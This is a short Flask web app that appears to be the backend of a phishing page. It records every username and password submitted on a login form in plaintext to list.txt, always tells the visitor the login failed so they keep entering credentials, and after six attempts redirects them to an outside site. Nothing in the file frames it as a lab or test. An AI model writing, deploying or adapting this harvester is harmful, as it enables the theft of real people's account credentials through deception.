from flask import Flask, render_template, request, redirect

app = Flask(__name__)

# Initialize the login attempts counter
login_attempts = 0

@app.route('/', methods=['GET', 'POST'])
def index():
    global login_attempts
    message = ""  # Initialize the message variable

    if request.method == 'POST':
        # Get the username and password from the form
        username = request.form['username']
        password = request.form['password']

        # Open the file in append mode and write the username and password
        with open("list.txt", "a") as f:
            f.write(f"username={username}  password={password}\n")

        # Increment the login attempts counter
        login_attempts += 1

        if login_attempts >= 6:
            # Redirect to another URL after the 6th attempt
            return redirect('https://adnan4290.github.io')

        # Display an error message for incorrect login
        message = "Wrong username or password, please try again."

    return render_template('index.html', message=message)

if __name__ == '__main__':
    app.run(debug=True, host='0.0.0.0')
